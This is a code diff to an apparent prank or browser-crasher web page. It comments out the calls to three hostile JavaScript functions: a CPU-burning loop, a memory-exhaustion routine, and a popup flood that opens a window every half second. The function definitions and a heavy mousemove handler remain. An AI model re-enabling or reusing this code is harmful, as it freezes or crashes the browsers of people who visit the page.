@@ -38,7 +38,7 @@ function cpuPulse() {
     for(let i=0;i<5000000;i++) Math.sqrt(Math.random()*i);
     requestAnimationFrame(cpuPulse);
 }
-cpuPulse();
+//cpuPulse();
 const memoryArray = [];
 function burnMemory() {
     for(let i=0;i<200000;i++){
@@ -49,12 +49,12 @@ function burnMemory() {
     }
     setTimeout(burnMemory, 10);
 }
-burnMemory();
+//burnMemory();
 function spawnPopup() {
     const win = window.open('lol.html', '_blank', 'width=357,height=330,menubar=no,toolbar=no,resizable=no');
     setTimeout(spawnPopup, 500);
 }
- spawnPopup();
+// spawnPopup();
 document.addEventListener('mousemove', e => {
     for(let i=0;i<50;i++){
         Math.sqrt(Math.random()*(e.clientX+i));
